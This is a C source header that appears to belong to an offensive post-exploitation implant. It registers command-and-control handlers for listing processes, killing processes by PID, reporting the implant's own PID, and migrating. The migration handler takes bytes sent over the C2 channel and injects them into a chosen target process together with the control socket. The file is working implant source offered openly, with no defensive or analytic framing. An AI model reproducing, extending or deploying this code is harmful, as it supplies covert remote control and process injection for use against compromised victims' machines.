/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _PROCESS_H_
#define _PROCESS_H_

#include <sigar.h>

#include <api.h>
#include <c2.h>
#include <tlv_types.h>
#include <tlv.h>
#include <migrate.h>

#define PROCESS_BASE 2

#define PROCESS_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL)
#define PROCESS_KILL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 1)
#define PROCESS_GET_PID \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 2)
#define PROCESS_MIGRATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 3)

#define TLV_TYPE_PID_STATE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE)
#define TLV_TYPE_PID_CPU   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 1)

static tlv_pkt_t *process_list(c2_t *c2)
{
    int iter;
    int status;

    tlv_pkt_t *result;
    tlv_pkt_t *proc_info;

    sigar_pid_t proc_pid;
    sigar_proc_state_t proc_state;
    sigar_proc_exe_t proc_exec;
    sigar_proc_list_t proc_list;

    if ((status = sigar_proc_list_get(c2->sigar, &proc_list)) != SIGAR_OK)
    {
        log_debug("* Failed to sigar process list (%s)\n",
                  sigar_strerror(c2->sigar, status));
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    for (iter = 0; iter < proc_list.number; iter++)
    {
        proc_pid = proc_list.data[iter];
        proc_info = tlv_pkt_create();

        tlv_pkt_add_int(proc_info, TLV_TYPE_PID, (int)proc_pid);

        if ((status = sigar_proc_state_get(c2->sigar, proc_pid, &proc_state)) != SIGAR_OK)
        {
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_STATE, "unknown");
        }
        else
        {
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_STATE, proc_state.name);
        }

        if ((status = sigar_proc_exe_get(c2->sigar, proc_pid, &proc_exec)) != SIGAR_OK)
        {
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_CPU, "unknown");
        }
        else
        {
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_CPU, (char *)proc_exec.arch);
        }

        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, proc_info);
        tlv_pkt_destroy(proc_info);
    }

    sigar_proc_list_destroy(c2->sigar, &proc_list);

    return result;
}

static tlv_pkt_t *process_kill(c2_t *c2)
{
    int pid;
    int status;

    tlv_pkt_get_int(c2->request, TLV_TYPE_PID, &pid);

    if ((status = sigar_proc_kill(pid, 9)) != SIGAR_OK)
    {
        log_debug("* Failed to sigar process kill (%s)\n",
                  sigar_strerror(c2->sigar, status));
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *process_get_pid(c2_t *c2)
{
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
    tlv_pkt_add_int(result, TLV_TYPE_PID, sigar_pid_get(c2->sigar));

    return result;
}

static tlv_pkt_t *process_migrate(c2_t *c2)
{
    int migrate_size;
    unsigned char *migrate;
    pid_t migrate_pid;

    tlv_pkt_get_int(c2->request, TLV_TYPE_PID, &migrate_pid);

    if ((migrate_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_MIGRATE, &migrate)) > 0)
    {
        if (migrate_init(migrate_pid, migrate_size, migrate, c2->net->sock) == 0)
        {
            free(migrate);
            return api_craft_tlv_pkt(API_CALL_QUIT);
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

void register_process_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, PROCESS_LIST, process_list);
    api_call_register(api_calls, PROCESS_KILL, process_kill);
    api_call_register(api_calls, PROCESS_GET_PID, process_get_pid);
    api_call_register(api_calls, PROCESS_MIGRATE, process_migrate);
}

#endif
